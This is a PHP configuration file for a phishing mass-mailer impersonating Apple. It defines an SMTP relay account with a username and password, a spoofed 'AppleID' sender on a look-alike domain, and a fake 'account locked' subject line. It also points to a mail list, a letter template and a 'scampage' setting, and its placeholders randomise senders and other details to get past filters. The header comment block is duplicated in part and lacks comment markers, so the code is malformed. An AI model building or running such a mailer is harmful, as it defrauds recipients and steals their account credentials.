<?php

// Format letter:
            ##email## : replace the contents of the letter to show the recipient's email
            ##subject## : Using random subject
            ##frommail## : Using random From mail
            ##fromname## : Using random From name
            ##short## : Using random your URL 
            ##country## : Using random country around the world
            ##date## : Using date time. (NOT RANDOM)
            ##country## : Using random country around the world
            ##date## : Using date time. (NOT RANDOM)
            ##OS## : Using random Operating Systems
            ##browser## : Using random Browsers
//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     		=> "smtp-relay.gmail.com",
        "port"     		=> "587",
       	"smtp_secure" 	=> "tls", // or false
        "username"		=> "admin@andrpa.com",
        "password" 		=> "fudpages"
    ],
   
];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "AppleID",
    "frommail"       => "Notification##randstring##.##randstring##@##randstring##.manage-inbox.online",
    "subject"        => $date . " Your AppleID Has been locked for security reasons",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://google.com"],
];
